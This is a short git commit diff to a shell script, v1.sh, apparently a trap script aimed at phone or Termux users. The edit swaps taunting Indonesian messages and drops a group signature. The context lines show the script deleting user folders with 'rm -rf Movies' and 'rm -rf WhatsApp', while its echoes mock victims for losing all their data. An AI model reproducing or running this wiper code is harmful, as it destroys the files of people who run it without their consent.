55d70d349057d36562d9abee83f61cb20ed34229
BlackCyber009 <57897184+BlackCyber091@users.noreply.github.com>
2019-11-26 18:12:48 +0700

    Update v1.sh

--- v1.sh
+++ v1.sh
@@ -14,6 +14,5 @@ rm -rf Movies
 rm -rf WhatsApp
 echo "Mampues Hilang Semua Data Loe"
 echo "Udah Di Bilangin Jagan Di Pakai Ya Masih Di Pakai"
-echo "Mr.Devil Tersakiti Ya Gini"
+echo "Mr.Croot Tersakiti Ya Gini"
 echo "Salah Siapa Gk Percaya"
-echo "Salam Dari DrCyberTeam"
